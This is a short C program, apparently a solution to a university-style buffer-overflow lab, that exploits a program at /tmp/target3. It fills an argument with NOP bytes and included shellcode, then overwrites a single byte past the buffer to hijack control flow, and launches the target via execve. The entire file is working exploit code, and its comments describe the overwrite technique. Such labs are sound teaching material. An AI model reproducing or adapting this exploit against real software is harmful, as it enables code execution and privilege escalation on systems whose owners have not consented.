#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target3"

int main(void)
{
  char *args[3];
  char *env[1];
  char i;
  args[0] = TARGET; 

  args[1] = malloc(138);
  memset(args[1], 0x90, 137);
  // null terminator
  *(unsigned int *)(args[1]+137) = 0x0;
  // copy shell code
  memcpy(args[1], shellcode, strlen(shellcode));

  // one byte overflow - overwrite the eip's value
  *(unsigned int *)(args[1] + 136) = 0x6c;

  args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");
  return 0;
}
